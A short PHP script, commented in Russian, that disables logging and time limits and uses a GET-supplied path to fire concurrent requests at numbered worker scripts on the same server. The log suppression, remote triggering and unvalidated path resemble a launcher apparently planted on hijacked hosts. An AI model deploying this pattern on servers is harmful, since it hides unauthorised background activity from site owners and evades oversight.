<?php
ignore_user_abort(true);
set_time_limit(0);
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
function read_file($file_name) 	// $file_name - имя текст дока, который надо прочитать. $arr_name - имя массива, в который надо сохранить.
		{
			$list = dirname(__FILE__)."/"."$file_name";
			$file = fopen($list,"rt");
			$arr_file = explode("\n",fread($file,filesize($list)));
			fclose($file);
			return $arr_file;
		}
function start_work($off, $unto)
{
	require_once('mcurl2.class.php');
	$urls = array ();
	$domen = $_SERVER['SERVER_NAME'];
	$path = $_GET['path'];
	$path = trim($path);
	for ($i=$off; ($i<=$unto); $i++)	// Кол-во потоков. (файлов 1.php, 2.php, 3.php, etc)
		{
			$url = "http://$domen/"."$path"."/$i.php";
			$urls[] = trim($url);
		}
		
		$mcurl = new MCurl();
		$mcurl->setTimeout(15);
		$mcurl->setUrls($urls);
		$mcurl->scan();
		$result = $mcurl->getResults();
}

$round = $_GET['round'];
$end = ($round * 20);	// 10
$start = ($end - 19);	// 1
start_work($start,$end);
?>